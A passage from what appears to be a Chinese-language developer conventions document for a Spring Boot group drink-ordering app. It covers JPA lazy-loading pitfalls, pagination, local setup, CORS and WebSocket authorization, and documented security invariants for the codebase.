之後任何對 LAZY 關聯的存取都會拋 `LazyInitializationException` → 固定 500。

已經踩過同一顆雷九次，歸納為下面四種型態：

1. **Service 內組 Map 時讀 LAZY 關聯** — `PublicService.buildStoreCard`、
   `ProductService.getProductDetail`、`StoreService.getProfile` 都會讀 `store.getBrand()`。
   修法：方法（或整個 class）加 `@Transactional(readOnly = true)`。
   `StoreService.getProfile` 是門市後台每一頁頁首都會打的端點，壞掉時整個後台的
   營業狀態永遠停在「讀取中…」。
2. **Controller 直接回傳 JPA entity** — `GET /api/stores/{storeId}/v2` 與
   `/api/stores/brand/{brandId}` 原本回傳 `Store`，Jackson 序列化 `brand` / `region`
   proxy 時 session 早已關閉，**必定 500**。這種加 `@Transactional` 沒用（序列化發生在交易之後），
   要在交易內就轉成純 Map。兩支都已改走 `StoreService.toMap()`。

3. **Controller 拿 entity 出來自己組 Map** — `OrderController.buildOrderResponse` 讀
   `order.getStore().getStoreName()`，而 Controller 不在交易內。這種要嘛讓查詢
   `@EntityGraph` 把關聯一起載入（`findWithStoreAndInitiatorById`），要嘛整段移進 Service。
4. **Service 回傳 entity、Controller 才轉 DTO** — `getGroupOrderByOrderId` 回
   `Optional<GroupOrder>`，Controller 拿到後才呼叫 `convertToDTO`，此時交易早就結束。
   已改成 `getGroupOrderDTOByOrderId`，轉換留在交易內。

**不要從 Controller 直接回傳 JPA entity。** 除了這個問題，entity 還會把整個物件圖攤開來，
且欄位一旦新增就自動外流（目前靠 `passwordHash` 上的 `@JsonProperty(WRITE_ONLY)` 擋著，
那是最後一道防線，不該是唯一一道）。

**同理，也不要把 entity 當成 Service 的回傳值再到外面轉換**——轉換寫在哪裡，
就決定了它有沒有交易可用。

> 這顆雷至今踩過九次，其中「下單完成頁」與「揪團成員清單」兩處是實際點過畫面才發現的：
> 端點單獨 curl 會過（資料剛好沒有那個關聯），要照使用者的路徑走完整流程才會現形。

這類錯誤**單元測試抓不到、要實際打端點才會現形**。改完動到序列化或關聯的程式碼後，
跑一次涵蓋所有 GET 端點的普掃（起服務後逐一 curl，看有沒有 5xx 或 body `code=500`）比較實在。

## 品項規則抽在 `service/order/`，不要抄回 Service 裡

`GroupOrderService` 太大，三條與金額／防竄改有關的規則已抽成純函式，
新增或修改品項邏輯時請直接用這三個，不要在 Service 內再寫一份：

| 類別 | 規則 |
|------|------|
| `ItemSpecResolver` | 商品的某個規格類型只有唯一選項時（例如熱飲只賣熱的），**一律採用該選項，不採信用戶端送來的值**。這是防竄改規則，不是顯示邏輯 |
| `ItemHash` | 決定「什麼算同一杯」。配料**必須先排序**再串接，否則同樣的兩杯會算出不同 hash 而不會合併顯示 |
| `CouponEligibility` | 券的品牌／指定商品適用範圍；已付款的品項不可再套券 |

⚠️ `ItemSpecResolver` 那段原本在 `addItem` 與 `updateItem` 各寫一次，兩邊行為
只差在「沒帶欄位時要不要動」。抽出來之後 `addItem` 用 `resolveOrEmpty`（欄位不可為 null）、
`updateItem` 用 `resolve`（沒帶就不呼叫），規則本身共用同一份。

這三支都有純邏輯測試（`src/test/java/com/example/demo/service/order/`，19 個、跑 0.05 秒），
改規則時測試會跟著紅——已驗證把防竄改改回「照單全收」時 4 個測試失敗。

## ⚠️ 列表端點一律要分頁

`GET /api/stores/orders` 曾經一次回傳該門市的**全部歷史訂單**：壓測實測 6,666 筆、
2.1 MB，50 併發下 p50 從 0.14 秒惡化到 2.7 秒、p99 超過 10 秒，比其他端點慢 50~60 倍。
查詢本身不慢（索引有生效），慢在序列化與傳輸整份歷史。

現已改為 `Pageable`：`page`（預設 0）、`size`（預設 50、上限 200 由
`AnalyticsService.MAX_PAGE_SIZE` 把關），回傳 `{ orders, page, size, total, totalPages, hasNext }`。
前端 `StoreAPI.getOrders()` 會解包成陣列以相容既有畫面，需要分頁資訊請用 `getOrdersPage()`。

**新增任何會隨營運時間累積的列表端點（訂單、交易紀錄、評價）時，一律帶 Pageable。**

## 統一回應格式

```json
{ "code": "200", "msg": "success", "data": { ... } }
```
- 前端依 `code === 200` 或 `code === '200'` 判斷成功
- 401/403 自動跳轉登入頁

## 本機開發設定

**資料庫與 Redis 皆由本機 Docker 提供。**

1. `docker compose up -d` — 啟動 MySQL 8（`localhost:3306`）與 Redis 7（`localhost:6379`）
2. `mvn spring-boot:run` — `application.yml` 的預設值已對應上述容器，不需額外設定
3. 首次啟動且資料表為空時，`DemoDataSeeder` 會植入示範品牌／門市／飲品／顧客
   （帳號見 README，密碼皆為 `demo1234`）。正式環境務必 `DEMO_DATA_ENABLED=false`
4. Cloudinary 憑證為選填：填了就上傳雲端，沒填則由 `ImageStorageService` 自動改存
   本機 `uploads/`（以 `/uploads/**` 提供），因此不需任何第三方帳號即可完整運作
5. 本機 `sms.mode=mock`，跳過 Firebase 驗證，不需要 `serviceAccountKey.json`
6. 啟動埠：`8082`；Swagger UI：`http://localhost:8082/swagger-ui.html`
7. 容器映像（選用）：`docker build -t joindrink .`。映像內含 `frontend/`；資料庫與 Redis 需由外部提供。部署細節見 `docs/DEPLOYMENT.md`

設定值一律走 `${ENV_VAR:本機預設值}`，`application.yml` 內不再有任何明文密鑰。

## CORS 白名單

由 `app.cors.allowed-origins`（`application.yml`）單一來源提供，
`SecurityConfig`（HTTP）與 `WebSocketConfig`（STOMP handshake）**共用同一份**，
可用環境變數 `CORS_ALLOWED_ORIGINS` 覆寫：

預設清單（與 `application.yml` 的 `${CORS_ALLOWED_ORIGINS:…}` 預設值完全一致）：

- `http://localhost:5173`
- `http://127.0.0.1:5500`
- `http://localhost:5500`
- `http://localhost:8082`
- `http://127.0.0.1:8082`

本機額外的來源（Live Server 改用 5501／5502、IDE 內建伺服器的臨時埠、3000、8080 等）不再寫在預設值裡，改放在 `application-local.yml`（範本見 `application-local.yml.example`），或在啟動時設定 `CORS_ALLOWED_ORIGINS`。

⚠️ 曾因 WebSocket 端獨立寫成 `setAllowedOriginPatterns("*")`，
與 HTTP 端白名單自相矛盾而完全對外放行。新增來源請只改設定檔，不要在程式碼中另寫一份。
`WebConfig` 也曾有第三份 `addCorsMappings("/**").allowedOrigins("*")`，被 Spring Security
的 CORS filter 遮蔽而未生效，但同樣自相矛盾，已移除。

## WebSocket / STOMP 安全

`/ws-cart` 的 SockJS handshake 走 CORS 白名單；STOMP 層由
`WebSocketConfig.configureClientInboundChannel` 掛上 `StompAuthInterceptor`，攔截：

- **CONNECT**：必須帶 `Authorization: Bearer <jwt>`，驗證後綁為連線的 Principal
- **SUBSCRIBE**：`/topic/order/{id}` 僅限該訂單的**發起人或參與者**
  （參與者以 `order_items` 判定，揪團成員才看得到自己團的狀態）；
  `/topic/group/{token}` 的 token 本身即分享憑證，已認證即可訂閱

⚠️ 先前完全沒有攔截器，且 `orderId` 是連續整數可直接列舉，任何人都能旁觀他人訂單狀態。
前端（`group_order.html`、`order_details.html`、`order_confirm.html`）已改為在
`stompClient.connect()` 第一個參數帶入 token，新增 STOMP 頁面時別忘了。

## 前端架構

- **Customer 前台** (`/frontend/Customer/`)：顧客端，含登入/註冊（`auth/` 8頁）、首頁、地圖、店家列表、購物車、結帳、訂單、揪團、個人資料等 12 頁，共 20 HTML
- **Brand 後台** (`/frontend/Brand/`)：品牌管理後台，含 Dashboard、菜單、規格加料、門市管理、財務、口碑監控、熱銷趨勢（7 頁）
- **Store 後台** (`/frontend/store/`)：門市後台，含訂單管理、庫存、營業時間、配送設定、財務報表、評分（12 頁）
- 前端 JS 以模組化方式分割（每支 API 獨立 `*-api.js` 或 `api-*.js`）
- JWT 存於 `localStorage`，每次請求自動帶入 `Authorization: Bearer <token>`
- 側邊欄由 `store-shell-boot.js`（head 最早載入，防閃爍）+ `store-shell.js`（RWD 響應式 Shell）管理

## 特殊功能

- **優惠券轉盤**：遊戲化抽獎，優惠券圖片由 Java 2D + NotoSansTC 字型動態生成後上傳 Cloudinary
- **區域定價**：同品牌不同地區可有不同分類加價（`brand_region_category_pricing`）
- **商品快照**：訂單建立時儲存當下商品/價格快照，避免日後價格異動影響歷史訂單
- **帳號合併**：社群登入與傳統帳號可合併（`/api/auth/merge/*`）
- **優惠券到期排程**：`CouponExpiryScheduler` 自動處理到期
- **即時推播**：WebSocket/STOMP 推送訂單狀態與揪團品項異動（非 SSE，見上方說明）
- **圖片儲存**：一律走 `ImageStorageService`，**不要直接呼叫 `cloudinary.uploader()`**。
  有憑證上傳 Cloudinary，沒有則存本機 `uploads/` 並以 `/uploads/**` 提供，
  讓專案不需任何第三方帳號即可完整運作
- **GroupOrder V2**：完整揪團流程（品項 CRUD、套用優惠券、結帳、補款）
- **常用地址管理**：使用者可儲存多筆常用地址（`user_addresses`），結帳時快速選用

## ⚠️ 前端資源一律放 `frontend/vendor/`，不要再引入 CDN

Tailwind、Leaflet、Lucide、Chart.js、SockJS/STOMP、QRCode、Font Awesome、Bootstrap Icons、
Material Symbols 都已收進 `frontend/vendor/`（`scripts/vendor-assets.sh` 可重新抓取）。

原因：這些原本全從 CDN 載，網路不通時會出現 `L is not defined` / `tailwind is not defined`，
地圖、結帳、揪團、個人資料四頁直接壞掉，Tailwind 掛掉更是整頁沒樣式。

`scripts/ui/harness.js` 的 `E2E_OFFLINE=1` 會擋掉所有連外請求，**CI 固定開著**。
新增 `<script src="https://...">` 會讓普掃在斷網下轉紅。

沒收進來的（刻意）：內文字型（載不到只是退回系統字型，Noto Sans TC 光 subset 就 315 個檔）、
地圖圖磚、Nominatim 地址搜尋、Firebase 社群登入——後三者本質上是線上服務。

## ⚠️ 時區只在 `config/TimeZoneConfig` 設定一次

`TimeZone.setDefault(Asia/Taipei)` 必須放在 `@PostConstruct`，**不可搬回 `main()`**——
測試不會呼叫 `main()`（`@SpringBootTest` 直接建 context），時區就會和正式啟動不一致。

在 UTC 的機器上（CI 就是）會疊出兩次 ＋8：`DemoDataSeeder` 明確用
`ZoneId.of("Asia/Taipei")` 一次，`spring.jpa.properties.hibernate.jdbc.time_zone`
寫入時再換算一次，示範資料的 `created_at` 因此落在 16 小時後的未來，
永遠排在錢包帳本最上面。本機時區剛好是 Asia/Taipei 時兩次換算會互相抵銷，
所以這個問題**只有 CI 抓得到**，要重現得把 MySQL 換成 UTC 容器。

## 重要注意事項

- `application.yml` 已全面改為 `${ENV_VAR:預設值}`，**不要把明文密鑰寫回去**
- `serviceAccountKey.json` 與 `application-local.yml` 已在 `.gitignore`
- DB DDL：`spring.jpa.hibernate.ddl-auto`（本機 `update`，production 需改 `validate`/`none`）。目前沒有遷移工具，Flyway 導入的做法見 `docs/adr/0008-schema-migrations.md`
  - ⚠️ YAML 冒號後**一定要有空格**。曾寫成 `ddl-auto:validate` 導致
    `spring.jpa.hibernate` 被解析成字串、Spring 綁定失敗而無法啟動。
- SMS 為 mock 模式。設定鍵是頂層的 `sms.mode`，**不是** `app.sms.mode`
  （`AuthService` 讀的是 `${sms.mode:firebase}`，放錯層級會靜默 fallback 成 firebase）
- `app.reset_password_url` 目前是死設定，程式中沒有任何地方讀取
- `jwt.secret` **至少 64 個字元**（UTF-8 原始位元組，HS512 需 ≥512 bits）。
  長度不足時 `JwtUtils` 的 `@PostConstruct` 會讓應用**啟動失敗**並印出明確訊息。
  - 曾因 `signWith(alg, String)` 會先把 secret 做 Base64 **解碼**，70 字元的預設值
    只剩 52 bytes，導致「註冊成功但一登入就 500」。現改用
    `Keys.hmacShaKeyFor(secret.getBytes(UTF_8))`，字面長度即金鑰長度。
  - 更換 `JWT_SECRET` 會使既有 token 全部失效，使用者需重新登入
- Token 有效期讀 `jwt.expiration`（預設 24h）。曾因 `JwtUtils` 寫死
  `@Value("604800000")` 而變成 7 天、設定檔完全不生效
- `GlobalExceptionHandler` 已區分用戶端錯誤：找不到路由→404、缺參數/型別錯→400、
  method 不支援→405；500 只回泛用訊息，**內部例外細節一律只寫進 log 不外流**
- Redis 為真實服務（Docker），已移除 `embedded-redis`。`RedisCartService` /
  `DailySpinService` 直接依賴 `StringRedisTemplate`，Redis 沒跑會在呼叫時失敗；
  `RedisLockService` 則有本機鎖 fallback
- `order_reviews` 表與 Entity 已從程式碼移除，評分統一使用 `order_ratings`
- 轉盤實際路由為 `/api/coupons/spin`（執行）、`/api/coupons/spin-status`（狀態查詢），品牌列表為 `/api/game-wheel/brands`，**非** `/api/daily-spin/*`
- GroupOrder V2 刪除路由為 `/api/group-orders/token/{token}`（加 `token/` 前綴），`/api/group-orders/{token}` 為 GET 查詢


## 2026-10-11 第二輪複查後新增的不變量

- **第三方登入的新帳號只能經 `POST /api/auth/social-signup` 建立**（先驗證手機 OTP，再建立帳號）。`socialLogin` 不得再以請求中未驗證的 `phone` 寫入使用者；全新手機會回 201，前端導向 `verify-phone.html?type=social-signup`。
- **`PUT /api/auth/update` 不接受改手機**。手機是登入與重設密碼的依據，必須經 Firebase 手機驗證，不可在沒有 OTP 的端點直接改。`UserService.registerUser` 已移除（無呼叫者，且會接受未驗證手機）。
- **取消揪團品項或整單時，取得列鎖後必須再用 `OrderStatusGuard.isOpenOrSubmitted` 檢查狀態**。控制器在鎖外做的檢查無法保證當下仍是 OPEN／SUBMITTED。
- **`POST /api/orders/{orderId}/cancel` 走 `GroupOrderService.cancelAsInitiator`**（列鎖、退款、還原券，與 `cancel/v2` 相同）。`OrderService.cancelOrder` 已移除，它不退款、也不還原優惠券。
- **結帳通知所需的門市 id 與總額由 `GroupOrderService.getCheckoutNotifyInfo` 在交易內取得**，控制器不得拿 entity 出去再 `getStore()`。`paymentMethod` 不可為空，且只接受 `WALLET`／`CASH`／`CREDIT_CARD`（回 400；白名單為 `GroupOrderController.ALLOWED_PAYMENT_METHODS`，不可只留 `WALLET`／`CASH`，會擋下團購頁預設的 `CREDIT_CARD`，見 N-18）。團購頁的儲值金（`STORE_CREDIT`）在送出前映射為 `WALLET`（見 N-15）；`CREDIT_CARD` 後端視為門市付款（見 N-22）。
- **使用者可控名稱的寫入規則在 `common/SafeText`**：自己送來的值用 `normalizeDisplayName`（不合規回 400）；第三方登入帶來的名稱用 `sanitizeDisplayName`（清理、截斷、不失敗）。
- **前端含 HTML 的模板字串中插入名稱類欄位，一律以頁面內的轉義函式包住**（自動規則注入的是 `escHtmlSafe`，既有頁面用 `esc`／`escapeHtml`）。**不要對已在來源處轉義的變數再轉義一次**，否則會顯示成 `&amp;`。
- **`onclick="…${值}…"` 的 JS 字串內不得插入名稱類資料**：HTML 轉義不能防止字串跳脫。改用 `data-*` 屬性，由事件函式讀取 `dataset`（見 `profile.html` 的 `editExtraAddressFromEl`）。
- **`permitAll` 一律指定 HTTP method**（`SecurityConfig`）。`/api/stores/auth/**` 只開放 POST，`/api/menu/**`、`/api/home/**`、`/api/location/**`、`/api/group-orders/join/**` 等只開放 GET；WebSocket 的 `/ws/**`、`/ws-cart/**` 例外，因為 SockJS 會用到多種方法。
- **WebSocket 的 SUBSCRIBE 依角色授權**（`StompAuthInterceptor.authorizeSubscribe`，規則本體在 `StompSubscribeRules`）：`/topic/order/{id}` 限顧客且須為參與者；`/topic/group/{token}` 限顧客；`/topic/store/{id}` 只允許該門市本人（角色為 `STORE` 且 id 相符）；其餘目的地一律拒絕。principal 必須帶 `role`，因為門市與顧客的 id 會撞號。
- **`docker-compose.yml` 的 MySQL 與 Redis 埠口只綁 `127.0.0.1`**；正式環境範本關閉 springdoc（`application-prod.yml.example`）。

## 2026-10-12 新增的不變量與約定

- **結帳冪等**：`POST /api/orders/checkout` 接受選擇性的 `Idempotency-Key` 標頭，由 `service/IdempotencyService` 處理（範圍為 `checkout` 加上 JWT 使用者 id；鍵須符合 `^[A-Za-z0-9_-]{8,64}$`）。成功的請求重送時會回放第一次的結果並帶 `Idempotent-Replayed: true`；進行中的重複請求回 409；非 2xx 會釋放鍵。**新增任何可能被重送的金流 POST，一律沿用這個 helper，不要另外發明儲存方式。** 已知缺口：伺服器不比對 body 指紋，同一把鍵搭配不同的 body 會回放第一次的結果（見 ADR-0005）。
- **不信任 `X-Forwarded-For`**：限流與識別一律以 `getRemoteAddr()` 為準（`LoginAttemptLimiter.clientIp`）。`server.forward-headers-strategy`（環境變數 `SERVER_FORWARD_HEADERS_STRATEGY`，預設 `native`）決定容器是否信任反向代理送來的 `X-Forwarded-*`；部署到代理之後必須明確設定，並確認代理會覆寫這些標頭（見 `docs/DEPLOYMENT.md`、ADR-0004）。
- **新增 `permitAll` 路由，必須同步更新 `AuthorizationRouteInventoryTest`**：把路徑加入 `PUBLIC_GET` 或 `PUBLIC_POST`，讓公開例外在 review 中可見。其他非公開路由的匿名呼叫必須回 401／403，否則該測試會紅（見 ADR-0003）。
- **排程任務以 `ExclusiveJobRunner.runExclusively(jobName, leaseSeconds, job)` 包住**（Redis 鍵 `lock:job:<name>`），多實例時同一時間只會有一個實例執行。這是互斥，不是「每天只跑一次」，因此任務本身必須冪等（見 ADR-0006）。
- **業務錯誤用 `CustomException`，code 填 HTTP 狀態碼字串**（如 `"409"`、`"422"`、`"503"`、`"400"`）。`GlobalExceptionHandler` 會轉成對應的 HTTP 狀態；不要在 Controller 手寫錯誤 Map。已知不一致：`OrderService.createOrder` 的結帳鎖忙碌時拋出的是 `RuntimeException`，待統一，見 `docs/IMPROVEMENT_ASSESSMENT.md`。
- **CORS 的預設值只存在 `application.yml`**（`app.cors.allowed-origins`，環境變數 `CORS_ALLOWED_ORIGINS`），本機額外來源寫在 `application-local.yml`。上方「CORS 白名單」一節必須與預設值一致。
- **Actuator 只開放 `health`，且 `show-details` 為 `never`**。不要為了除錯暴露更多端點；需要的資訊走 log，並以 `X-Request-Id` 串接。
- **`X-Request-Id`**：每個回應都帶此標頭。合規的傳入值會沿用（`^[A-Za-z0-9_-]{8,64}$`），否則產生新的 32 位十六進位 id；它同時被寫進每一行 log 的 MDC。
- **靜態頁面由後端的 `common/WebConfig` 以 `file:frontend/…` 提供**，Docker 映像的工作目錄因此必須有 `frontend/`（見 `Dockerfile`）。新增執行期需要的頂層目錄時，要同步更新 Dockerfile；`.dockerignore` 排除了 `docs/`、`scripts/`、`.github/`。
